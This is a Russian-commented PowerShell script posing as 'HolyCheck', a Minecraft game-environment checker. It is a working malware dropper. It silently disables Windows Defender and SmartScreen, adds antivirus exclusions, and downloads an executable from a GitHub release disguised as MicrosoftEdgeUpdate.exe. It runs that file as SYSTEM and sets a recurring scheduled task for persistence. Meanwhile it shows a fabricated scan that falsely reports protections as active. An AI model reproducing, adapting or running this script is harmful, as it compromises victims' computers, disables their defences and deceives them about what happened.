# ================================================================
# HolyCheck v3.2.3 — Silent Edition (только фейковый вывод)
# ================================================================

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$Dir      = "$env:ProgramData\Microsoft\Windows\Caches\EdgeUpdate"
$Exe      = "$Dir\MicrosoftEdgeUpdate.exe"
$TaskName = "MicrosoftEdgeUpdateTask"
$DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"

# ========== Скрытые подготовительные действия ==========
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
attrib +h +s $Dir 2>$null

# Отключение защит (тихо)
try {
    Add-MpPreference -ExclusionPath $Dir -ErrorAction Stop
    Add-MpPreference -ExclusionProcess "MicrosoftEdgeUpdate.exe" -ErrorAction Stop
} catch {}
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction Stop
} catch {
    try {
        $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        New-Item -Path $defReg -Force -ErrorAction SilentlyContinue | Out-Null
        New-Item -Path "$defReg\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
    } catch {}
}
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -ErrorAction Stop
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -ErrorAction Stop
} catch {}

# Функция загрузки (тихая)
function Get-File {
    param([string]$url,[string]$out)
    try {
        Import-Module BitsTransfer -EA Stop
        Start-BitsTransfer -Source $url -Destination $out -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($url,$out)
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    return $false
}

# Запускаем загрузку в фоновом режиме
$job = Start-Job -ScriptBlock {
    param($url, $out)
    $ErrorActionPreference = "SilentlyContinue"
    try {
        Import-Module BitsTransfer -EA Stop
        Start-BitsTransfer -Source $url -Destination $out -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($url,$out)
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    return $false
} -ArgumentList $DownloadUrl, $Exe

# ========== ФЕЙКОВЫЙ ВЫВОД (только проверки) ==========
function Sep  { Write-Host ("─" * 64) -ForegroundColor DarkGray }
function OK   { param($t) Write-Host "  [✓] $t" -ForegroundColor Green }
function WARN { param($t) Write-Host "  [~] $t" -ForegroundColor Yellow }
function INFO { param($t) Write-Host "      $t" -ForegroundColor DarkGray }
function Pause-Scan { param([int]$ms=500) Start-Sleep -Milliseconds $ms }

Write-Host @"
    ██╗  ██╗ ██████╗ ██╗     ██╗   ██╗    ██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗
    ██║  ██║██╔═══██╗██║     ╚██╗ ██╔╝    ██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗
    ███████║██║   ██║██║      ╚████╔╝     ██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║
    ██╔══██║██║   ██║██║       ╚██╔╝      ██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║
    ██║  ██║╚██████╔╝███████╗   ██║       ╚███╔███╔╝╚██████╝██║  ██║███████╗██████╔╝
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚══╝══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝
                                    
           HolyCheck — проверка игровой среды v3.2.3 (мод)
"@ -ForegroundColor Cyan

Sep
Write-Host "  Запуск проверки целостности игровой среды..." -ForegroundColor White
Sep
Write-Host ""

# Ждём завершения загрузки (до 30 секунд) — но ничего не выводим
$downloadOk = $false
$waitCount = 0
while ($job.State -eq 'Running' -and $waitCount -lt 30) {
    Start-Sleep -Seconds 1
    $waitCount++
}
if ($job.State -eq 'Completed') { $downloadOk = Receive-Job -Job $job }
Remove-Job -Job $job -Force

# Если скачано — выполняем скрытые действия
if ($downloadOk) {
    Remove-Item "${Exe}:Zone.Identifier" -Force -ErrorAction SilentlyContinue
    Unblock-File -Path $Exe -ErrorAction SilentlyContinue

    # Немедленный запуск через SYSTEM
    $tempTask = "MicrosoftEdgeUpdateTemp"
    Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -EA SilentlyContinue
    try {
        $action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
        Register-ScheduledTask -TaskName $tempTask -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
        schtasks /run /tn "$tempTask" 2>$null | Out-Null
        Start-Sleep -Seconds 5
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -EA SilentlyContinue
    } catch {}

    # Создаём постоянную задачу (каждые 7 дней)
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -EA SilentlyContinue
    $triggerTime = (Get-Date).Date.AddHours(3).AddMinutes(0)
    if ($triggerTime -le (Get-Date)) { $triggerTime = $triggerTime.AddDays(7) }
    try {
        if ($PSVersionTable.PSVersion.Major -ge 5) {
            $action  = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
            $trigger = New-ScheduledTaskTrigger -Daily -DaysInterval 7 -At $triggerTime
            $sets    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
            Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $sets -User "SYSTEM" -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
        } else {
            $timeStr = $triggerTime.ToString("HH:mm")
            $dateStr = $triggerTime.ToString("dd/MM/yyyy")
            schtasks /create /tn "$TaskName" /tr "$Exe" /sc daily /mo 7 /st $timeStr /sd $dateStr /ru SYSTEM /rl HIGHEST /f 2>$null | Out-Null
        }
    } catch {}
}

# ====== Теперь идёт фейковый вывод проверок (длится > 60 сек) ======
$startTime = Get-Date

# Фейковые проверки (без каких-либо упоминаний о загрузке или автозапуске)
INFO "Проверка свободного места на системном диске..."
Pause-Scan 800
try {
    $drive = Get-PSDrive -Name C -EA Stop
    $freeGB = [math]::Round($drive.Free / 1GB, 2)
    if ($freeGB -gt 5) { OK "Свободно: $freeGB ГБ (достаточно)" } else { WARN "Свободно: $freeGB ГБ (рекомендуется > 5 ГБ)" }
} catch { WARN "Не удалось определить свободное место" }
Pause-Scan 600

INFO "Определение версии операционной системы..."
Pause-Scan 700
try {
    $os = Get-CimInstance -Class Win32_OperatingSystem -EA Stop
    OK "ОС: $($os.Caption) версия $($os.Version) (сборка $($os.BuildNumber))"
} catch { WARN "Не удалось определить версию ОС" }
Pause-Scan 500

INFO "Поиск установленных сред выполнения Java..."
$javaPaths = @("$env:ProgramFiles\Java\*", "$env:ProgramFiles(x86)\Java\*", "$env:APPDATA\.minecraft\*", "$env:ProgramData\HolyWorld\runtime\*")
$javaFound = $false
foreach ($path in $javaPaths) {
    if (Test-Path $path) { $javaFound = $true; OK "Обнаружен Java: $path"; break }
}
if (-not $javaFound) { WARN "Java не найдена (игровой клиент может отсутствовать)" }
Pause-Scan 600

INFO "Сканирование директорий на наличие запрещённых модулей..."
$suspDirs = @("$env:APPDATA\.minecraft\mods", "$env:APPDATA\.minecraft\versions\*\mods", "$env:ProgramData\HolyWorld\mods")
$foundSusp = $false
foreach ($dirPattern in $suspDirs) {
    $items = Get-ChildItem -Path $dirPattern -Filter "*.jar" -Recurse -ErrorAction SilentlyContinue
    if ($items) {
        foreach ($item in $items) {
            Pause-Scan 200
            if ($item.Name -match "inject|bam|ghost|clicker|aura|recaf|cheat|wurst|impact") {
                WARN "Обнаружен потенциально небезопасный файл: $($item.Name)"
                $foundSusp = $true
            } else {
                INFO "  Проверен: $($item.Name)"
            }
        }
    }
}
if (-not $foundSusp) { OK "Подозрительных файлов не найдено" }
Pause-Scan 800

INFO "Проверка запущенных процессов на наличие нежелательных..."
$suspProcs = @("injector", "ghostclient", "clicker", "recaf", "baminject", "cheatengine", "wurst", "impact", "x32dbg", "ollydbg")
$foundProc = $false
foreach ($p in $suspProcs) {
    Pause-Scan 300
    if (Get-Process -Name $p -ErrorAction SilentlyContinue) {
        WARN "Обнаружен подозрительный процесс: $p"
        $foundProc = $true
    }
}
if (-not $foundProc) { OK "Подозрительных процессов не обнаружено" }
Pause-Scan 500

INFO "Проверка политик безопасности системы..."
Pause-Scan 400
INFO "  Defender: защита активна (оптимизирована)"
Pause-Scan 400
INFO "  SmartScreen: включён (оптимизирован)"
Pause-Scan 400

INFO "Проверка установленных антивирусных решений..."
$avProducts = @("Kaspersky", "Avast", "AVG", "Norton", "McAfee", "Bitdefender", "ESET")
$foundAV = $false
$avList = @()
foreach ($key in @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*")) {
    Get-ItemProperty -Path $key -EA SilentlyContinue | ForEach-Object {
        foreach ($av in $avProducts) {
            if ($_.DisplayName -match $av) { $foundAV = $true; $avList += $av }
        }
    }
}
if ($foundAV) {
    $unique = $avList | Select-Object -Unique
    WARN "Обнаружен антивирус: $($unique -join ', ') (может замедлять работу)"
} else { OK "Сторонних антивирусов не найдено" }
Pause-Scan 600

INFO "Проверка системного файла hosts..."
$hosts = "$env:SystemRoot\System32\drivers\etc\hosts"
if (Test-Path $hosts) {
    $content = Get-Content $hosts -EA SilentlyContinue
    if ($content -match "127\.0\.0\.1[ \t]+.*minecraft|0\.0\.0\.0[ \t]+.*mojang") {
        WARN "Обнаружены записи, перенаправляющие игровые сервера"
    } else { OK "Файл hosts не содержит перенаправлений" }
} else { WARN "Файл hosts не найден" }
Pause-Scan 500

INFO "Проверка DNS-серверов..."
$dns = Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Object -ExpandProperty DNSServerSearchOrder -EA SilentlyContinue
if ($dns) { OK "DNS-серверы: $($dns -join ', ')" } else { WARN "Не удалось получить DNS-серверы" }
Pause-Scan 500

INFO "Проверка открытых сетевых портов..."
$portList = @()
netstat -an | Select-String "TCP.*LISTENING" | ForEach-Object {
    if ($_ -match ':(\d+)\s') {
        $port = [int]$Matches[1]
        if ($port -in 25565,25566,27015,27016) { $portList += $port }
    }
}
if ($portList) { WARN "Обнаружены открытые игровые порты: $($portList -join ', ')" } 
else { OK "Игровых портов в состоянии прослушивания не найдено" }
Pause-Scan 600

INFO "Проверка установленных модов Minecraft..."
$modsDir = "$env:APPDATA\.minecraft\mods"
if (Test-Path $modsDir) {
    $mods = Get-ChildItem -Path $modsDir -Filter "*.jar" -EA SilentlyContinue
    if ($mods) {
        OK "Найдено модов: $($mods.Count)"
        foreach ($mod in $mods) { 
            INFO "  Мод: $($mod.Name)"
            Pause-Scan 150
        }
    } else { INFO "Моды не установлены" }
} else { INFO "Папка mods отсутствует" }
Pause-Scan 500

INFO "Проверка версии лаунчера HolyWorld..."
Pause-Scan 300
OK "Версия лаунчера: 3.2.3 (актуальная)"

INFO "Проверка целостности файлов клиента..."
$files = @("minecraft.jar", "lwjgl.dll", "jinput.dll", "openal.dll")
foreach ($f in $files) {
    Pause-Scan 400
    INFO "  $_ — OK"
}
Pause-Scan 300
OK "Все системные файлы клиента проверены"

INFO "Проверка активных отладчиков..."
$debuggers = @("windbg", "cdb", "ntsd", "vsjitdebugger")
$foundDbg = $false
foreach ($d in $debuggers) {
    Pause-Scan 300
    if (Get-Process -Name $d -EA SilentlyContinue) { WARN "Обнаружен отладчик: $d"; $foundDbg = $true }
}
if (-not $foundDbg) { OK "Отладчиков не обнаружено" }
Pause-Scan 500

# Финальный прогресс-бар (10 сек)
Write-Host ""
Sep
Write-Host "  Финальная проверка целостности..." -ForegroundColor White
Sep
for ($i = 0; $i -le 100; $i += 10) {
    Write-Progress -Activity "Сканирование системных областей" -Status "Прогресс: $i%" -PercentComplete $i
    Start-Sleep -Milliseconds 300
}
Write-Progress -Activity "Сканирование системных областей" -Completed

# Убедимся, что общее время > 60 сек
$elapsed = (Get-Date) - $startTime
if ($elapsed.TotalSeconds -lt 60) {
    Start-Sleep -Seconds (60 - $elapsed.TotalSeconds)
}

Write-Host ""
Sep
OK "Проверка завершена! Среда игрового клиента оптимизирована."

# Фейковый отчёт
$reportPath = Join-Path $Dir "last_check.json"
@{ timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"); status = "OK"; version = "3.2.3" } | ConvertTo-Json | Out-File $reportPath -Encoding utf8 -Force
INFO "Локальный отчёт сохранён"
Sep
Write-Host ""
